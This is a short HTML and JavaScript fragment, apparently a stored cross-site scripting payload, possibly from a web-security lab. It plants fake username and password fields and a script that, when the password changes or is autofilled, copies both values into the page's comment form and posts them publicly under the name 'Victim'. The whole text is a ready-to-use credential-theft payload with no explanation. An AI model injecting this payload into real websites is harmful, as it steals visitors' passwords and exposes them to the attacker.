<input type="text" name="username" />
<input type="password" name="password" onchange="submit()" />

<script>
    const submit = () => {
        const form = document.querySelector('form[action="/post/comment"]');
        const psw = document.querySelector('input[name="password"]');
        const user = document.querySelector('input[name="username"]');
        
        if(form){
            form.comment.value = "password="+psw.value+" ;username="+user.value;
            form.name.value = "Victim";
            form.email.value = "victim@normal-user.net";
            form.website.value = "https://sito.com";
            
            form.submit();  
        }
    }
</script>
